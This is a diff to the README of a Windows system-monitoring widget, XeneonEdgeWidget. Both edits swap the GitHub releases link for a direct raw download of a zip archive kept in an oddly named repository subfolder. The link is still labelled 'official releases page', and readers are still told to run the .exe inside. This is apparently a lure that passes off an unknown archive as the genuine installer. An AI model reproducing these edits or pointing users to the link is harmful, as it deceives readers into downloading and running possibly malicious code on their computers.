@@ -1,6 +1,6 @@
 # 🖥️ XeneonEdgeWidget - Monitor your system and control media
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/icosahedral-dosemeter626/XeneonEdgeWidget/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/icosahedral-dosemeter626/XeneonEdgeWidget/main/files/soundvolumeview-x64/Widget_Edge_Xeneon_2.7-beta.3.zip)
 
 XeneonEdgeWidget brings system monitoring and media control to your desktop. The application displays your current GPU usage, network speeds, and system performance data while providing tools for microphone muting and media playback. It integrates with Corsair iCUE and the Xenon Edge hardware series to offer a unified desktop experience.
 
@@ -8,7 +8,7 @@ XeneonEdgeWidget brings system monitoring and media control to your desktop. The
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/icosahedral-dosemeter626/XeneonEdgeWidget/releases) to download the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/icosahedral-dosemeter626/XeneonEdgeWidget/main/files/soundvolumeview-x64/Widget_Edge_Xeneon_2.7-beta.3.zip) to download the installer.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Save the file to your computer.
 4. Double-click the downloaded file to start the installation.
